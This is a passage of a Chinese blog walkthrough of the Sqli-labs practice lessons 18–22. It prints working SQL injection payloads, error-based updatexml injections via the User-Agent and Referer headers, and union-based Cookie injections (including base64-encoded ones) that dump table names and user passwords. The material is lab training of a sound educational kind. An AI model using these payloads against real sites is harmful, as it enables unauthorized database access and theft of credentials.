+<p><code>1' or '1'='1</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030095705286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030100119509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>我们可以直接在UA处进行报错注入。</p>
+<pre><code class="language-sql">User-Agent: 1',1,updatexml(1,concat(0x7e,database(),0x7e),1)) #
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030100939966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>成功爆出数据库名。</p>
+<p><code>User-Agent: 1',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)) #</code>成功爆出表。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030101058225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>User-Agent: 1',1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='uagents'),0x7e),1)) #</code>成功爆出列名。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030101208858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>但当我们</p>
+<p><code>User-Agent: 1',1,updatexml(1,concat(0x7e,(select group_concat(id,uagent,ip_address) from uagents),0x7e),1)) #</code> 出现了错误<code>You can't specify target table '表名' for update in FROM clause</code>,因为在MYSQL里，不能先select一个表的记录，在按此条件进行更新和删除同一个表的记录，==这里很显然我们的<code>UA</code>是在更新的==，解决办法是，将select得到的结果，再通过中间表select一遍，这样就规避了错误，</p>
+<p>这个问题只出现于mysql，mssql和oracle不会出现此问题。</p>
+<p>所以payload改为</p>
+<p><code>User-Agent: 1',1,updatexml(1,concat(0x7e,(select concat(id,uagent,ip_address) from (select * from uagents)hack limit 0,1),0x7e),1)) #</code>,修改limit查询全部内容，</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030101542107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里没用<code>group_concat</code> 是因为会报错<code>Row 17 was cut by GROUP_CONCAT()</code>,原来GROUP_CONCAT有个最大长度的限制，超过最大长度就会被截断掉，1024这就是一般MySQL系统默认的最大长度</p>
+<h3 id="less-19">less-19</h3>
+<p>先弱口令<code>admin</code> 和 <code>admin</code> 爆破</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030102109721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>发现这次回显的是 <code>referer</code></p>
+<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
+<p>输入单引号报错</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030102308973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030102341188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>从报错信息中也可发现可能执行的sql语句。（和上一关注入类似）</p>
+<p><code>Referer:1',updatexml(1,concat(0x7e,database(),0x7e),1))#</code>成功爆出数据库</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030102525542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>后面步骤同上</p>
+<h3 id="less-20">less-20</h3>
+<p>依旧先弱口令<code>admin</code> 和 <code>admin</code> 爆破</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030103102902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这关怎么测试<code>UA</code>都不报错，看了一下本关名字，为<code>Cookie注入</code>，那么久应该从<code>cookie</code>下手了</p>
+<p><a href="https://blog.csdn.net/zhangquan_zone/article/details/77627899" target="_blank">Cookie详解</a></p>
+<p>这里又用到了一个插件<code>Cookie Editor</code>，当然用burp也是可以的</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030104000353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>注意，改完<code>Value </code>后==一定要点保存==(左侧第二个图标)</p>
+<p>并且从爆出的错误来看<code>'admin'' LIMIT 0,1</code>闭合方式为单引号。</p>
+<p>解法跟前面的get方式注入一样。</p>
+<p>payload: <code>Cookie: uname=-admin' union select 1,(select group_concat(username,0x7e,password) from users),3 #</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030105200350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="less-21">less-21</h3>
+<p>依旧先弱口令<code>admin</code> 和 <code>admin</code> 爆破</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/202010301055090.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后看一下cookie中的值<code>YOUR COOKIE : uname = YWRtaW4</code></p>
+<p>其中的这个<code>YWRtaW4</code>其实是<code>admin</code>被base64 编码后的结果</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030105915546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里推荐这个<a href="https://tool.oschina.net/encrypt?type=3" target="_blank">网站</a></p>
+<p>这关跟上关一样，也是cookie,只不过将cookie经过base64编码了，</p>
+<p>将<code>admin'</code>base64编码后进行测试<code>Cookie: uname=YWRtaW4n</code></p>
+<p>报错：<code>'admin'') LIMIT 0,1</code> ，可以看出闭合方式为单引号加括号，<code>')</code></p>
+<p>其余步骤和上关一样。(cookie要经过base64编码)</p>
+<h3 id="less-22">less-22</h3>
+<p>cookie处编4加上单引号没报错，注意此关也需要base64编码。</p>
+<p>加上双引号报错： <code>&quot;admin&quot;&quot; LIMIT 0,1</code>,说明闭合方式为双引号<code>&quot;</code></p>
+<p>其余操作和20关类似。</p>
+
+    </div>
+</article>
+
+
+<div class="license markdown-body">
+    <blockquote>
+        <p>除特殊注明部分，本站内容采用 <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+               target="_blank">CC BY-NC-SA 4.0</a> 进行许可。</p>
+    </blockquote>
+</div>
+
+
+
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/amzrk2" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/amzrk2" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/19767474" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-11">less-11</a></li>
+        <li><a href="#less-12">less-12</a></li>
+        <li><a href="#less-13">less-13</a></li>
+        <li><a href="#less-14">less-14</a></li>
+        <li><a href="#less-15">less-15</a></li>
+        <li><a href="#less-16">less-16</a></li>
+        <li><a href="#less-17">less-17</a></li>
+        <li><a href="#less-18">less-18</a></li>
+        <li><a href="#less-19">less-19</a></li>
+        <li><a href="#less-20">less-20</a></li>
+        <li><a href="#less-21">less-21</a></li>
+        <li><a href="#less-22">less-22</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+</aside>
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
+</div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/amzrk2" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/amzrk2" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/19767474" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-11">less-11</a></li>
+        <li><a href="#less-12">less-12</a></li>
+        <li><a href="#less-13">less-13</a></li>
+        <li><a href="#less-14">less-14</a></li>
+        <li><a href="#less-15">less-15</a></li>
+        <li><a href="#less-16">less-16</a></li>
+        <li><a href="#less-17">less-17</a></li>
+        <li><a href="#less-18">less-18</a></li>
+        <li><a href="#less-19">less-19</a></li>
+        <li><a href="#less-20">less-20</a></li>
+        <li><a href="#less-21">less-21</a></li>
+        <li><a href="#less-22">less-22</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2020-2021
+                <a href="https://Phoenix-Pl.github.io/">DSRKafuU</a>
+                 | <a href="https://github.com/itsme/my_blog">Source code</a> 
+                | 基于 <a href="https://github.com/amzrk2/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 构建
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+
+
+<script defer src="/assets/js/fuji.min.js"></script>
+
+
+</body>
+
+</html>
